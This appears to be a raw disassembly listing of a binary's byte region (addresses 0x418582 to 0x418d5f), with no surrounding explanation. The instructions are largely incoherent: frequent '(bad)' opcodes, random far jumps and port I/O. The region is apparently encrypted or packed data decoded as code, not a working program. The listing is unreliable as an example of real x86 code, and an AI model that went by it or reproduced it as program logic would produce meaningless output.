  418582:	div    BYTE PTR [ecx+esi*1]
  418585:	sub    DWORD PTR [ecx],ecx
  418587:	popa   
  418588:	sub    cl,cl
  41858a:	fidiv  DWORD PTR [ecx]
  41858c:	xor    DWORD PTR [ebx],edi
  41858e:	jmp    0x418584
  418590:	add    BYTE PTR [edi],bh
  418592:	pop    ecx
  418593:	(bad)  
  418594:	test   eax,0x781e77f6
  418599:	ret    0xe615
  41859c:	dec    ebp
  41859d:	sbb    BYTE PTR ds:0xbb0879be,ah
  4185a3:	sub    dl,BYTE PTR [edx+edx*8-0x7f]
  4185a7:	inc    eax
  4185a8:	jmp    0x20c22ff6
  4185ad:	sub    DWORD PTR [esi+ebp*1+0x15],esp
  4185b1:	and    eax,0x505e67f
  4185b6:	jecxz  0x4185ed
  4185b8:	lods   eax,DWORD PTR ds:[esi]
  4185b9:	mov    al,0xad
  4185bb:	imul   esi,esi,0xed5c154f
  4185c1:	xor    edx,esi
  4185c3:	lock pop edi
  4185c5:	pop    ebx
  4185c6:	loope  0x418559
  4185c8:	mov    ds,WORD PTR [ecx+ecx*8]
  4185cb:	sub    DWORD PTR [esp+eax*1-0x3e957058],eax
  4185d2:	jp     0x41862a
  4185d4:	xor    al,0x7f
  4185d6:	push   esi
  4185d7:	xor    eax,0x3a5dd1e7
  4185dc:	pcmpgtd mm6,QWORD PTR [edx+ebp*2+0x52]
  4185e1:	pop    esi
  4185e2:	sub    al,0xe5
  4185e4:	(bad)  
  4185e5:	daa    
  4185e6:	int    0xfd
  4185e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185e9:	(bad)  
  4185ea:	push   edx
  4185eb:	scas   al,BYTE PTR es:[edi]
  4185ec:	inc    edx
  4185ed:	mul    BYTE PTR [edi]
  4185ef:	xchg   DWORD PTR cs:[ecx+0x4474c035],ebp
  4185f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f7:	loope  0x41861a
  4185f9:	jno    0x4185b8
  4185fb:	mov    esi,DWORD PTR [ebp+0x751a5a03]
  418601:	xchg   ebx,eax
  418602:	dec    eax
  418603:	hlt    
  418604:	in     eax,dx
  418605:	aad    0x11
  418607:	or     ch,BYTE PTR [esi+0x4b]
  41860a:	out    0x21,al
  41860c:	loop   0x418689
  41860e:	jbe    0x41864d
  418610:	loopne 0x41860f
  418612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418613:	push   eax
  418614:	jo     0x418597
  418616:	cmp    BYTE PTR [ebx-0x7a],cl
  418619:	shl    DWORD PTR [ecx],0x57
  41861c:	sub    al,0x3f
  41861e:	inc    esi
  41861f:	shld   ebp,esp,0x54
  418623:	sub    DWORD PTR [eax+0x691db155],ebp
  418629:	call   FWORD PTR [ebx]
  41862b:	dec    ecx
  41862c:	rcl    ecx,0xf
  41862f:	push   esp
  418630:	clc    
  418631:	out    0x12,eax
  418633:	jmp    0x41869c
  418635:	xchg   DWORD PTR [ebx+0x511797e4],eax
  41863b:	call   0xa549:0x8b47cd3c
  418642:	loope  0x418625
  418644:	in     eax,dx
  418645:	(bad)  
  418646:	cmp    al,0xef
  418648:	out    dx,al
  418649:	xlat   BYTE PTR cs:[ebx]
  41864b:	adc    DWORD PTR [edx+0x4d22a916],esi
  418651:	pop    ebx
  418652:	mov    dl,0xad
  418654:	or     DWORD PTR [edx],edx
  418656:	fwait
  418657:	les    edi,FWORD PTR [edi-0x12]
  41865a:	cs pop eax
  41865c:	jb     0x41867b
  41865e:	(bad)  
  41865f:	push   eax
  418660:	cdq    
  418661:	push   esp
  418662:	mov    esp,eax
  418664:	shr    DWORD PTR [esi-0xe],1
  418667:	(bad)  
  418668:	mov    ebp,0x571664be
  41866d:	in     eax,dx
  41866e:	mov    ss,WORD PTR [ecx+0x4f6993fe]
  418674:	mov    edi,0x114442d0
  418679:	xor    DWORD PTR [eax-0x69b1b91c],edx
  41867f:	add    dl,BYTE PTR [ecx+0x6c]
  418682:	dec    eax
  418683:	pop    edi
  418684:	data16 fadd st,st(4)
  418687:	aas    
  418688:	dec    edx
  418689:	mov    ah,0x52
  41868b:	dec    ebp
  41868c:	lods   al,BYTE PTR ds:[esi]
  41868d:	hlt    
  41868e:	adc    DWORD PTR [ebx+0x70],edi
  418691:	retf   
  418692:	out    0x1b,al
  418694:	sbb    al,0x1b
  418696:	lock sbb esp,DWORD PTR [ecx-0x1e]
  41869a:	sub    bh,BYTE PTR [edx-0x5cfadda0]
  4186a0:	pop    ebp
  4186a1:	ror    DWORD PTR [edx+0x3d77356a],1
  4186a7:	ds jo  0x418657
  4186aa:	and    DWORD PTR [esi+0x42],ebp
  4186ad:	inc    edx
  4186ae:	scas   al,BYTE PTR es:[edi]
  4186af:	popa   
  4186b0:	or     ecx,DWORD PTR [eax+0x1d]
  4186b3:	sbb    ah,cl
  4186b5:	fistp  WORD PTR [eax+0x41]
  4186b8:	mov    ds:0x3cf7bfe,al
  4186bd:	and    al,0x31
  4186bf:	jb     0x4186bf
  4186c1:	dec    ecx
  4186c2:	pop    edx
  4186c3:	pop    eax
  4186c4:	push   ds
  4186c5:	sbb    BYTE PTR [ebp+0x25b0f689],bh
  4186cb:	hlt    
  4186cc:	pop    es
  4186cd:	mov    ds:0x72c135a1,eax
  4186d2:	jo     0x41874c
  4186d4:	fnstcw WORD PTR [edx+0xc]
  4186d7:	or     edi,esp
  4186d9:	mov    esi,0x39878a24
  4186de:	adc    al,0x80
  4186e0:	sub    BYTE PTR [ebp-0x1c],cl
  4186e3:	lahf   
  4186e4:	dec    edx
  4186e5:	shr    ebp,1
  4186e7:	ret    0x980d
  4186ea:	ret    
  4186eb:	push   ss
  4186ec:	and    esp,DWORD PTR [ebp+0x20]
  4186ef:	(bad)  
  4186f0:	icebp  
  4186f1:	sbb    eax,0x50ffb2e2
  4186f6:	add    cl,BYTE PTR [eax+eax*2]
  4186f9:	pusha  
  4186fa:	out    dx,al
  4186fb:	imul   ebx,DWORD PTR [edi-0x4d],0x12
  4186ff:	mov    ds:0x5e0cd5da,eax
  418704:	jl     0x4186c7
  418706:	stos   BYTE PTR es:[edi],al
  418707:	adc    cl,ch
  418709:	xchg   esp,eax
  41870a:	in     al,dx
  41870b:	sub    eax,0x3514ba06
  418710:	push   eax
  418711:	std    
  418712:	fstp   DWORD PTR [esi+0x1b89c51a]
  418718:	adc    DWORD PTR [edx+esi*2],ecx
  41871b:	scas   al,BYTE PTR es:[edi]
  41871c:	test   DWORD PTR [eax-0x4a5d3814],eax
  418722:	xchg   esi,eax
  418723:	jle    0x4186dc
  418725:	sbb    eax,0x1db77c94
  41872a:	xor    DWORD PTR [edi],edi
  41872c:	push   0xffffff87
  41872e:	push   edx
  41872f:	push   edi
  418730:	lea    eax,[eax-0x41]
  418733:	rcr    BYTE PTR [ebx-0x55975281],1
  418739:	add    ebp,ecx
  41873b:	out    0xee,eax
  41873d:	stc    
  41873e:	pop    esp
  41873f:	jp     0x4186cc
  418741:	cmp    eax,DWORD PTR [edi-0x30]
  418744:	pop    ss
  418745:	sbb    ecx,DWORD PTR [ebx+0x5f]
  418748:	icebp  
  418749:	dec    ecx
  41874a:	add    eax,0xd8493104
  41874f:	fbstp  TBYTE PTR [ecx]
  418751:	and    eax,0xdd06507c
  418756:	sbb    al,0x92
  418758:	cmp    bl,BYTE PTR [ebp+0x70788300]
  41875e:	mov    DWORD PTR [esi+ecx*8-0xa],edx
  418762:	mov    WORD PTR [eax+0x2c],fs
  418765:	jne    0x418781
  418767:	mov    eax,ds:0x2bea4411
  41876c:	xchg   edx,eax
  41876d:	outs   dx,BYTE PTR ds:[esi]
  41876e:	stc    
  41876f:	retf   0x4c42
  418772:	(bad)  
  418773:	iret   
  418774:	fsub   st,st(2)
  418776:	jmp    0xe687:0x37e9651
  41877d:	push   0x13ce0641
  418782:	and    DWORD PTR [ecx-0x75],ebx
  418785:	sbb    ecx,edx
  418787:	dec    ebp
  418788:	adc    BYTE PTR [eax+0xf],al
  41878b:	std    
  41878c:	push   ss
  41878d:	(bad)  
  41878e:	adc    edx,DWORD PTR [ecx-0x6]
  418791:	outs   dx,BYTE PTR ds:[esi]
  418792:	jmp    edx
  418794:	add    esi,ebp
  418796:	icebp  
  418797:	pusha  
  418798:	or     ch,BYTE PTR [edx-0x57583324]
  41879e:	in     al,dx
  41879f:	mov    DWORD PTR [eax+edi*4+0x49],edx
  4187a3:	out    0x7a,eax
  4187a5:	popf   
  4187a6:	ins    DWORD PTR es:[edi],dx
  4187a7:	mov    ch,0x17
  4187a9:	rcl    DWORD PTR [edi-0x2b9bfb37],0x18
  4187b0:	je     0x418830
  4187b2:	int    0xd4
  4187b4:	retf   0xa52
  4187b7:	dec    edx
  4187b8:	xchg   esp,eax
  4187b9:	adc    BYTE PTR [ebp+0x71],bh
  4187bc:	fadd   QWORD PTR [ecx-0x5dc2d67d]
  4187c2:	inc    edi
  4187c3:	dec    eax
  4187c4:	jge    0x41882f
  4187c6:	aad    0x8a
  4187c8:	imul   eax,ebx,0xa0c0c765
  4187ce:	push   edi
  4187cf:	adc    al,0xae
  4187d1:	mov    edi,0xcef61a3f
  4187d6:	inc    edx
  4187d7:	mov    bh,0xfd
  4187d9:	pusha  
  4187da:	fdivr  DWORD PTR [esi-0x373784c5]
  4187e0:	out    dx,al
  4187e1:	cwde   
  4187e2:	test   eax,0x88dc3690
  4187e7:	addr16 inc ecx
  4187e9:	ins    DWORD PTR es:[edi],dx
  4187ea:	repnz sbb ecx,DWORD PTR [eax]
  4187ed:	cmp    al,0x6c
  4187ef:	sub    ch,al
  4187f1:	and    eax,0x35a9ff3e
  4187f6:	(bad)  
  4187f7:	in     eax,0x70
  4187f9:	and    al,0x57
  4187fb:	int3   
  4187fc:	push   eax
  4187fd:	inc    edx
  4187fe:	mov    ah,0x32
  418800:	test   eax,0x3d187f32
  418805:	(bad)  [ecx-0x7704922]
  41880b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41880c:	ja     0x4187e8
  41880e:	and    ebp,ebx
  418810:	dec    esi
  418811:	inc    edx
  418812:	fimul  WORD PTR [edi+0x29]
  418815:	into   
  418816:	into   
  418817:	or     al,0x88
  418819:	not    edx
  41881b:	pop    ss
  41881c:	clc    
  41881d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41881e:	adc    eax,0xd1b10145
  418823:	out    dx,al
  418824:	inc    DWORD PTR [edi-0x7d]
  418827:	imul   edi,DWORD PTR [esi+0x5681ca52],0x50b76e35
  418831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418832:	ja     0x418861
  418834:	inc    ebp
  418835:	push   ebx
  418836:	outs   dx,DWORD PTR ds:[esi]
  418837:	fcom   st(2)
  418839:	gs dec edx
  41883b:	sbb    DWORD PTR [edx+ebp*4+0x35],esi
  41883f:	jge    0x4187e6
  418841:	push   ebp
  418842:	mov    bl,BYTE PTR [esi]
  418844:	add    BYTE PTR [edx],dh
  418846:	mov    ds:0x1bac7003,eax
  41884b:	xchg   edx,eax
  41884c:	xchg   edx,eax
  41884d:	cmp    eax,0x72557442
  418852:	mov    edx,0x5c531666
  418857:	dec    eax
  418858:	xor    DWORD PTR [ecx+edx*4-0x1e230b00],esp
  41885f:	cmp    DWORD PTR [ecx+ebp*4+0x11308b41],ebx
  418866:	aaa    
  418867:	sbb    BYTE PTR [edi+0x4eed8079],0x6c
  41886e:	test   DWORD PTR [ecx-0x50ee353b],0xd5701afb
  418878:	repnz xor DWORD PTR [edx+0x11489e0f],edx
  41887f:	mov    al,0x9c
  418881:	lahf   
  418882:	gs loope 0x418829
  418885:	xor    DWORD PTR cs:[edi-0x23a82611],ebx
  41888c:	out    dx,al
  41888d:	shl    BYTE PTR [esi-0xbfa4ba8],0xcd
  418894:	sbb    esp,DWORD PTR [ecx-0x74d4c087]
  41889a:	xchg   ecx,eax
  41889b:	mov    dh,0x6e
  41889d:	out    0xf6,eax
  41889f:	out    dx,al
  4188a0:	push   esi
  4188a1:	jmp    0x418849
  4188a3:	iret   
  4188a4:	push   ecx
  4188a5:	xor    dh,BYTE PTR [eax]
  4188a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a8:	inc    eax
  4188a9:	cmp    eax,0x1e58911e
  4188ae:	mov    al,ds:0xd61f6d82
  4188b3:	dec    edx
  4188b4:	out    dx,eax
  4188b5:	push   es
  4188b6:	cmc    
  4188b7:	in     eax,dx
  4188b8:	lock popf 
  4188ba:	mov    dl,0x4a
  4188bc:	sbb    eax,0xe4c3d031
  4188c1:	xchg   BYTE PTR [ecx+0x10],al
  4188c4:	fcomp  DWORD PTR [ebp-0x39]
  4188c7:	pop    esp
  4188c8:	mov    eax,ds:0x9f500a53
  4188cd:	sahf   
  4188ce:	mov    dl,0x5f
  4188d0:	je     0x418858
  4188d2:	loopne 0x418897
  4188d4:	mov    ds:0xfa71b630,al
  4188d9:	into   
  4188da:	inc    edi
  4188dc:	sbb    al,0xbd
  4188de:	test   eax,0xeda04e5e
  4188e3:	adc    DWORD PTR [ebx-0x3c],0x76c1e4a6
  4188ea:	aam    0x84
  4188ec:	es cmc 
  4188ee:	mov    ecx,0xcb461100
  4188f3:	ret    0x3a38
  4188f6:	pop    esp
  4188f7:	hlt    
  4188f8:	pop    esp
  4188f9:	out    0x84,eax
  4188fb:	and    BYTE PTR [eax+0x269af99d],ah
  418901:	sbb    edi,edx
  418903:	cmp    al,dh
  418905:	inc    esp
  418906:	fadd   DWORD PTR [ebx-0x6]
  418909:	mov    DWORD PTR [ebp+0x14],ecx
  41890c:	inc    esi
  41890d:	stos   BYTE PTR es:[edi],al
  41890e:	je     0x4188e2
  418910:	jb     0x41891d
  418912:	xchg   edx,ebx
  418914:	mov    edx,0x645ebe47
  418919:	bound  ebx,QWORD PTR [ecx]
  41891b:	and    al,0x78
  41891d:	mov    al,0x86
  41891f:	jmp    0x236:0xc4846910
  418926:	mov    WORD PTR [esi+0x39],ss
  418929:	fsub   QWORD PTR [edx]
  41892b:	je     0x4188cb
  41892d:	hlt    
  41892e:	mov    ah,0x24
  418930:	ins    DWORD PTR es:[edi],dx
  418931:	stc    
  418932:	ficomp WORD PTR [ebp-0x21]
  418935:	ja     0x4188b9
  418937:	adc    BYTE PTR [edi],cl
  418939:	imul   esi,DWORD PTR [edx+0x78],0x9b44f6bc
  418940:	rcl    ecx,cl
  418942:	mov    bl,0x91
  418944:	jae    0x418951
  418946:	sar    esp,cl
  418948:	ja     0x418994
  41894a:	cwde   
  41894b:	fcomp  st(1)
  41894d:	xor    DWORD PTR [edi+0x5839165],esp
  418953:	xchg   esi,eax
  418954:	xor    BYTE PTR ds:0xc9f155dd,al
  41895a:	test   BYTE PTR [esi],dl
  41895c:	inc    ecx
  41895d:	xor    al,BYTE PTR [ecx]
  41895f:	mov    ch,0x48
  418961:	xor    al,0xb4
  418963:	xor    DWORD PTR [ebp+0x37a87dba],ebp
  418969:	add    DWORD PTR [esi+0x9cbfaba],eax
  41896f:	shl    BYTE PTR [ebx],cl
  418971:	popa   
  418972:	ret    
  418973:	inc    edi
  418974:	or     DWORD PTR [ebx],edx
  418976:	cmp    ecx,DWORD PTR [ecx+0x243103c7]
  41897c:	add    BYTE PTR [ebx-0x744d63ed],bl
  418982:	rcl    ch,cl
  418984:	push   ebp
  418985:	adc    BYTE PTR ds:0x9188b512,ch
  41898b:	dec    edi
  41898c:	rol    dl,0x41
  41898f:	das    
  418990:	jg     0x418970
  418992:	push   ecx
  418993:	ret    0x1b14
  418996:	adc    al,0xca
  418998:	mov    cl,0x74
  41899a:	cmp    BYTE PTR [ebp+0x44a2fea8],0x42
  4189a1:	inc    ebp
  4189a2:	inc    ecx
  4189a3:	ds popa 
  4189a5:	inc    edx
  4189a6:	(bad)  
  4189a7:	mov    ebp,0x4c3ce268
  4189ac:	shr    DWORD PTR [edx+esi*1+0x578fc068],0xa5
  4189b4:	test   eax,0xb8ebe73b
  4189b9:	sub    eax,0x1c767e18
  4189be:	mov    edx,0xc9fcafbd
  4189c3:	pusha  
  4189c4:	aaa    
  4189c5:	mov    edi,DWORD PTR [ecx+ecx*8+0x39fef8c9]
  4189cc:	inc    edx
  4189cd:	jne    0x4189bd
  4189cf:	das    
  4189d0:	jo     0x418985
  4189d2:	cwde   
  4189d3:	mov    ebp,0xa1365cc8
  4189d8:	nop
  4189d9:	out    0x3d,al
  4189db:	loop   0x418a3c
  4189dd:	mov    esi,0x4a59a1af
  4189e2:	and    bl,BYTE PTR ds:[ebx+0x52]
  4189e6:	jne    0x4189ee
  4189e8:	mov    dl,0x42
  4189ea:	inc    ecx
  4189eb:	mov    edx,DWORD PTR [esi-0x69]
  4189ee:	jnp    0x4189e0
  4189f0:	sbb    cl,BYTE PTR [ecx+0x5]
  4189f3:	or     al,0x50
  4189f5:	jb     0x418a6c
  4189f7:	push   eax
  4189f8:	xor    al,0x7d
  4189fa:	sbb    DWORD PTR [esi-0x5e],esi
  4189fd:	dec    ebp
  4189fe:	fwait
  4189ff:	dec    ebp
  418a00:	popf   
  418a01:	sbb    edi,ebx
  418a03:	popf   
  418a04:	fwait
  418a05:	add    eax,DWORD PTR [esi]
  418a07:	mov    esp,0xa5176b1
  418a0c:	cwde   
  418a0d:	push   ss
  418a0e:	push   0xffffffa1
  418a10:	cmp    al,0x4e
  418a12:	imul   eax,edx,0x10
  418a15:	inc    ebx
  418a16:	and    edx,DWORD PTR [edx+0x2c]
  418a19:	(bad)  
  418a1a:	xor    edx,DWORD PTR ds:0xe0c9bc54
  418a20:	adc    eax,0x3300998e
  418a25:	retf   
  418a26:	rcr    DWORD PTR [edx+0x41715e39],1
  418a2c:	or     eax,0xd3739aaf
  418a31:	mov    DWORD PTR [edx+edi*4],ecx
  418a34:	cli    
  418a35:	mov    eax,0xb6d974cb
  418a3a:	xchg   ecx,eax
  418a3b:	fisubr WORD PTR [ebp+0x7e]
  418a3e:	sbb    bh,bh
  418a40:	lds    ecx,FWORD PTR [eax-0x7bd1327b]
  418a46:	fcmovu st,st(3)
  418a48:	mov    dl,BYTE PTR [ebx-0x38566aa9]
  418a4e:	gs aam 0x99
  418a51:	inc    ebp
  418a52:	pop    eax
  418a53:	dec    edx
  418a54:	xchg   ebx,eax
  418a55:	iret   
  418a56:	aad    0x6a
  418a58:	mov    esp,0xdeebdabc
  418a5d:	ss sbb esp,edi
  418a60:	dec    esp
  418a61:	mov    esi,0x39901501
  418a66:	pop    esp
  418a67:	icebp  
  418a68:	jl     0x418a1e
  418a6a:	adc    eax,0x8dd7734d
  418a6f:	clc    
  418a70:	sbb    dl,BYTE PTR [esi+0x72]
  418a73:	div    DWORD PTR [esi]
  418a75:	retf   0xd216
  418a78:	pop    ebp
  418a79:	push   ecx
  418a7a:	sbb    eax,0xdd7b295f
  418a7f:	test   al,0xf0
  418a81:	jecxz  0x418a7a
  418a83:	and    DWORD PTR ds:0x1919e8f0,edi
  418a89:	cmp    dl,BYTE PTR [edi-0x780c9bfd]
  418a8f:	dec    eax
  418a90:	int3   
  418a91:	loope  0x418af0
  418a93:	sub    BYTE PTR [ebp-0x3f73d8c8],dh
  418a99:	add    eax,0x6fa8248b
  418a9e:	sbb    ah,bh
  418aa0:	faddp  st(2),st
  418aa2:	stc    
  418aa3:	imul   eax,esp,0xffffffaf
  418aa6:	daa    
  418aa7:	push   cs
  418aa8:	lock lock push ebx
  418aab:	rcr    ah,cl
  418aad:	cmp    ebp,DWORD PTR [ecx-0x40d97a22]
  418ab3:	mov    BYTE PTR [eax],dh
  418ab5:	sbb    DWORD PTR [esi+edx*1-0x54],0x343a65e9
  418abd:	cli    
  418abe:	outs   dx,DWORD PTR ds:[esi]
  418abf:	je     0x418b32
  418ac1:	mov    edi,esp
  418ac3:	and    eax,DWORD PTR ds:[eax+esi*1-0x2c]
  418ac8:	push   0xffffff8a
  418aca:	sbb    dh,BYTE PTR [eax]
  418acc:	and    cl,BYTE PTR [eax]
  418ace:	dec    esp
  418acf:	or     DWORD PTR [ebp-0x4669a84b],eax
  418ad5:	jecxz  0x418a90
  418ad7:	jne    0x418b54
  418ad9:	pop    edx
  418ada:	leave  
  418adb:	adc    DWORD PTR [edi+ecx*1],edx
  418ade:	mov    ebp,0xb9fce573
  418ae3:	cmp    ebx,DWORD PTR [eax-0x38]
  418ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae7:	jns    0x418ab1
  418ae9:	jae    0x418a7d
  418aeb:	lds    edi,FWORD PTR [edi-0x60]
  418aee:	in     eax,dx
  418aef:	mov    ebx,0xf3f18053
  418af4:	cmp    eax,0xb60c125e
  418af9:	pop    esp
  418afa:	xchg   ebx,eax
  418afb:	bswap  edi
  418afd:	sub    ah,BYTE PTR [ecx-0x5c]
  418b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b01:	fs (bad) 
  418b04:	mov    al,ds:0x5f1f26d9
  418b09:	mov    ch,0x4b
  418b0b:	inc    edx
  418b0c:	shl    esi,cl
  418b0e:	push   edx
  418b0f:	arpl   WORD PTR [esp+ecx*1-0x613c35],dx
  418b16:	mov    ds:0xf2df1599,eax
  418b1b:	adc    BYTE PTR [ecx-0x40],0x75
  418b1f:	sub    DWORD PTR [eax-0x1060e2df],ebx
  418b25:	add    eax,0x91b29fd7
  418b2a:	xor    bl,BYTE PTR [edi]
  418b2c:	rol    DWORD PTR [ebx],cl
  418b2e:	ror    bh,cl
  418b30:	inc    esp
  418b31:	adc    al,0xbf
  418b33:	jl     0x418b5c
  418b35:	sar    BYTE PTR [ebp+0x655bee20],cl
  418b3b:	iret   
  418b3c:	pop    ecx
  418b3d:	outs   dx,DWORD PTR ds:[esi]
  418b3e:	scas   al,BYTE PTR es:[edi]
  418b3f:	mov    bl,0xbb
  418b41:	jg     0x418ba5
  418b43:	fcom   DWORD PTR [ebx]
  418b45:	add    al,0x4
  418b47:	and    DWORD PTR [edi],ebp
  418b49:	or     BYTE PTR [ecx-0x3d86d074],bl
  418b4f:	je     0x418afe
  418b51:	cwde   
  418b52:	and    eax,0x8a8ea28a
  418b57:	pop    ebp
  418b58:	inc    edi
  418b59:	xchg   cl,al
  418b5b:	pop    ds
  418b5c:	clc    
  418b5d:	xor    ax,WORD PTR [edx+0x4dfa4bb2]
  418b64:	aas    
  418b65:	sbb    al,0x96
  418b67:	jae    0x418b8a
  418b69:	hlt    
  418b6a:	adc    al,0x44
  418b6c:	je     0x418bc9
  418b6e:	sbb    eax,DWORD PTR [ebx+eax*1+0x6c]
  418b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b73:	pop    ds
  418b74:	test   DWORD PTR [ebx+0xf],ebp
  418b77:	ja     0x418bbf
  418b79:	mov    eax,0x90d6e2ab
  418b7e:	loop   0x418b0d
  418b80:	loopne 0x418b1f
  418b82:	jbe    0x418b44
  418b84:	popa   
  418b85:	mov    eax,0xb21c9bf2
  418b8a:	popf   
  418b8b:	sub    ebp,DWORD PTR gs:[edx+ebp*4]
  418b8f:	mov    esi,0x4eb38a99
  418b94:	mov    ds:0x21762b5d,al
  418b99:	ret    0x1500
  418b9c:	mov    edi,0xf51150e9
  418ba1:	mov    eax,0xe0b99e71
  418ba6:	pop    ds
  418ba7:	pop    edx
  418ba8:	cli    
  418ba9:	daa    
  418baa:	and    ah,bh
  418bac:	je     0x418bc9
  418bae:	lods   eax,DWORD PTR ds:[esi]
  418baf:	in     eax,dx
  418bb0:	ret    
  418bb1:	inc    edx
  418bb2:	push   DWORD PTR [edx+0x18]
  418bb5:	adc    eax,0x81c324b6
  418bba:	mov    al,ds:0x37060830
  418bbf:	jge    0x418bde
  418bc1:	test   BYTE PTR [ebx],al
  418bc3:	pop    ecx
  418bc4:	mov    dh,0x75
  418bc6:	dec    ebx
  418bc7:	je     0x418bd4
  418bc9:	jae    0x418b8c
  418bcb:	push   esi
  418bcc:	xchg   esp,eax
  418bcd:	inc    ecx
  418bce:	lahf   
  418bcf:	out    0xb3,eax
  418bd1:	fistp  QWORD PTR [edx]
  418bd3:	ja     0x418bec
  418bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bd6:	mov    bl,0x4
  418bd8:	sbb    edx,DWORD PTR [ecx+0x57]
  418bdb:	ds add al,0x8e
  418bde:	cwde   
  418bdf:	mov    ebx,0x8ceaeaaf
  418be4:	into   
  418be5:	call   0xb89f:0xcdafd8bb
  418bec:	mov    edx,0xcfff1932
  418bf1:	sbb    ecx,ecx
  418bf3:	outs   dx,BYTE PTR ds:[esi]
  418bf4:	sbb    al,0xbc
  418bf6:	rcr    BYTE PTR [edx+0x7f],cl
  418bf9:	sbb    al,0xcc
  418bfb:	scas   al,BYTE PTR es:[edi]
  418bfc:	cmp    BYTE PTR [esi+eax*2],al
  418bff:	push   es
  418c00:	es popa 
  418c02:	jno    0x418c54
  418c04:	sbb    al,dl
  418c06:	(bad)  
  418c07:	test   al,0x4
  418c09:	inc    eax
  418c0a:	xchg   DWORD PTR [ebp+0x47],esp
  418c0d:	cmp    sp,WORD PTR [esp+eax*1-0x7429d84f]
  418c15:	fsubr  DWORD PTR [esi-0x73]
  418c18:	cmp    ah,cl
  418c1a:	or     al,0xc5
  418c1c:	inc    eax
  418c1d:	aad    0x8a
  418c1f:	push   edx
  418c20:	lea    edi,[ecx-0x58981dac]
  418c26:	mov    ds:0x888b144a,eax
  418c2b:	cs stos BYTE PTR es:[edi],al
  418c2d:	pop    eax
  418c2e:	retf   
  418c2f:	xchg   edi,eax
  418c30:	loopne 0x418bfe
  418c32:	aad    0x15
  418c34:	mov    esi,0x5685c440
  418c39:	dec    esi
  418c3a:	push   ss
  418c3b:	stc    
  418c3c:	cmp    al,0xbe
  418c3e:	jne    0x418c6a
  418c40:	sbb    ebp,ebp
  418c42:	xor    BYTE PTR [esi+ecx*4-0x6d],al
  418c46:	mov    esi,0x17c7f5cd
  418c4b:	dec    eax
  418c4c:	bound  edi,QWORD PTR [edx+0x46]
  418c4f:	sub    DWORD PTR [ebx+0x6f2cc5eb],ebx
  418c55:	push   ecx
  418c56:	test   al,0x23
  418c58:	aaa    
  418c59:	mov    ds:0x2cc28c7,al
  418c5e:	mov    DWORD PTR [esp+0x30],esi
  418c62:	call   0x720d:0xf6dbbd1e
  418c69:	fistp  DWORD PTR [edx+0x12]
  418c6c:	adc    BYTE PTR [esi-0x3b],bl
  418c6f:	scas   eax,DWORD PTR es:[edi]
  418c70:	gs mov bl,ah
  418c73:	cmp    DWORD PTR [esi+0x16338b58],edi
  418c79:	pop    esi
  418c7a:	in     eax,0x9
  418c7c:	push   0x3
  418c7e:	sbb    dl,BYTE PTR [edx]
  418c80:	or     edx,ebp
  418c82:	pop    esi
  418c83:	cmp    DWORD PTR [ecx-0x1f38b18e],edi
  418c89:	call   0xc51069c0
  418c8e:	jmp    0xb97e:0xf2adf681
  418c95:	push   esp
  418c96:	and    esi,DWORD PTR [eax-0x177ceaf4]
  418c9c:	les    esp,FWORD PTR [ecx]
  418c9e:	int3   
  418c9f:	mov    eax,ds:0xe316288d
  418ca4:	push   cs
  418ca5:	(bad)  
  418ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ca7:	add    ah,BYTE PTR [bx+di-0x4135]
  418cac:	leave  
  418cad:	xor    dl,BYTE PTR ds:0xc3974c12
  418cb3:	ja     0x418ca6
  418cb5:	ja     0x418d21
  418cb7:	mov    al,0x91
  418cb9:	xor    eax,0xc242c137
  418cbe:	or     dl,al
  418cc0:	xchg   edi,eax
  418cc1:	adc    al,0x84
  418cc3:	(bad)  
  418cc4:	fidiv  DWORD PTR [esi+0xf53fd45]
  418cca:	pop    ebx
  418ccb:	mov    ah,BYTE PTR [esi+0x4958f1dd]
  418cd1:	fcom   DWORD PTR [esi-0x2949f225]
  418cd7:	xchg   DWORD PTR [esp+eiz*8],eax
  418cda:	les    esi,FWORD PTR [esi-0x20c2c059]
  418ce0:	(bad)  
  418ce1:	out    dx,al
  418ce2:	xor    ecx,DWORD PTR [esp]
  418ce5:	push   eax
  418ce6:	push   0xffffffca
  418ce8:	xor    ch,BYTE PTR [edi+0x25b0e01f]
  418cee:	inc    edx
  418cef:	fisubr WORD PTR [ebx+eax*4-0x3c124377]
  418cf6:	aaa    
  418cf7:	in     al,dx
  418cf8:	pop    ss
  418cf9:	adc    DWORD PTR [ebp-0x25],esi
  418cfc:	pusha  
  418cfd:	imul   ebp,DWORD PTR [edi+0x42],0x8617a86d
  418d04:	fdivr  DWORD PTR [edi+0x11]
  418d07:	aas    
  418d08:	repz data16 in al,0x85
  418d0c:	dec    ecx
  418d0d:	inc    esi
  418d0e:	push   ebp
  418d0f:	repnz adc DWORD PTR ds:0x6ed67af5,ebx
  418d16:	mov    bl,0xe6
  418d18:	out    0x2b,al
  418d1a:	shl    eax,0x73
  418d1d:	pop    esi
  418d1e:	and    DWORD PTR [ebx+0x302dcee0],esp
  418d24:	sub    DWORD PTR [eax+ecx*2+0x1b22f3d4],eax
  418d2b:	leave  
  418d2c:	mov    al,ds:0x6ae1dfb2
  418d31:	add    al,BYTE PTR [edx-0x14]
  418d34:	icebp  
  418d35:	xor    al,0xdf
  418d37:	inc    esp
  418d38:	or     ebp,esi
  418d3a:	pop    ecx
  418d3b:	shl    BYTE PTR [edx+0x70],0x4b
  418d3f:	into   
  418d40:	add    BYTE PTR [esi-0x63],bl
  418d43:	mov    ch,0x69
  418d45:	(bad)  
  418d47:	js     0x418cff
  418d49:	cmp    eax,0xcfec940c
  418d4e:	daa    
  418d4f:	and    eax,0xe52b9875
  418d54:	call   0xb77a:0xe3b04265
  418d5b:	cmc    
  418d5c:	aaa    
  418d5d:	inc    edi
  418d5e:	(bad)  
  418d5f:	pop    edi
